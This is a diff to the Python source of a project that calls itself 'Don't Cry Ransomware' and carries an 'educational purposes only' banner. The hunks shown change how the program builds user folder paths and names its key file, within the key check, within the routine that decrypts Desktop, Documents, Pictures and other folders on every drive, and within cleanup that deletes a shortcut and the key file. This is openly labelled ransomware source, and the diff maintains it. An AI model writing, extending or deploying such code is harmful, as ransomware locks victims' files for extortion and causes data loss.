@@ -1,3 +1,4 @@
+
 ################################################################################
 #                             Don't Cry Ransomware                             #
 #                          ! EDUCATIONAL PURPOSES ONLY !                       #
@@ -8,6 +9,7 @@ import sys
 import base64
 import ctypes
 import string
+import getpass
 import hashlib
 from concurrent.futures import ThreadPoolExecutor
 
@@ -47,7 +49,7 @@ except KeyboardInterrupt:
 
 def is_valid_key(key):
     try:
-        key_file = os.path.join(os.environ["USERPROFILE"], "key")
+        key_file = os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256")
         if magic != b"DCRY+DKEY$":
             return False
         if not key or len(key) != 16 or not os.path.exists(key_file):
@@ -63,11 +65,11 @@ def start_decryption():
         print(f"\n{Fore.LIGHTRED_EX}Invalid key")
         input("Press enter to exit...")
         sys.exit(2)
-    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Desktop"), key)
-    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Downloads"), key)
-    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Documents"), key)
-    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Pictures"), key)
-    decrypt_directory(os.path.join(os.environ["USERPROFILE"], "Videos"), key)
+    decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), key)
+    decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), key)
+    decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), key)
+    decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), key)
+    decrypt_directory(os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), key)
     bitmask = ctypes.windll.kernel32.GetLogicalDrives()
     for disk in [
         f"{letter}:/"
@@ -100,7 +102,7 @@ def main():
             os.remove(shortcut_path)
         except:
             pass
-    key_path = os.path.join(os.environ["USERPROFILE"], "key")
+    key_path = os.path.join(f"C:\\Users\\{getpass.getuser()}", "key.sha256")
     if os.path.exists(key_path):
         try:
             os.remove(key_path)
